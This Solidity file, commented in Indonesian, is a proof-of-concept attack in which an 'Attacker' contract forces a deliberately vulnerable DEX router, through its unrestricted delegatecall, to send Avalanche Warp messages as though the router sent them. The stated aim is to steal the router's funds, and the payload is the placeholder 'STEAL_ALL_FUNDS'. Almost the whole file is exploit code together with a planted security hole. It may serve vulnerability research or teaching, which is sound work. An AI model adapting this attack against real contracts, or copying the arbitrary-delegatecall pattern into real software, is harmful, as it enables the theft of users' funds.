// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

// 1. Antarmuka standar Warp
interface IWarpPrecompile {
    function sendWarpMessage(bytes calldata payloadData) external returns (bytes32);
}

// 2. KORBAN (Victim DEX Router) - Kontrak sah yang menyimpan miliaran dolar
contract VulnerableDEXRouter {
    // Fungsi umum di DeFi untuk menjalankan logic batch/routing
    function executeRoute(address target, bytes calldata data) external payable {
        // VULNERABILITY: Eksekusi delegatecall ke target arbitrer
        (bool success, ) = target.delegatecall(data);
        require(success, "Route failed");
    }
}

// 3. PENYERANG (Attacker)
contract Attacker {
    address constant WARP_PRECOMPILE = 0x0200000000000000000000000000000000000005;

    function executeHeist(address dexRouter) external {
        // A. Buat payload maut (misal: format pesan pencairan USDC)
        bytes memory maliciousWarpPayload = "STEAL_ALL_FUNDS";

        // B. Encode pemanggilan fungsi Warp
        bytes memory delegateData = abi.encodeWithSelector(
            IWarpPrecompile.sendWarpMessage.selector, 
            maliciousWarpPayload
        );

        // C. Paksa DEX Router melakukan delegatecall ke Warp Precompile
        // EVM Avalanche akan melihat DEX Router sebagai pengirim, bukan Attacker!
        VulnerableDEXRouter(dexRouter).executeRoute(WARP_PRECOMPILE, delegateData);
    }
}
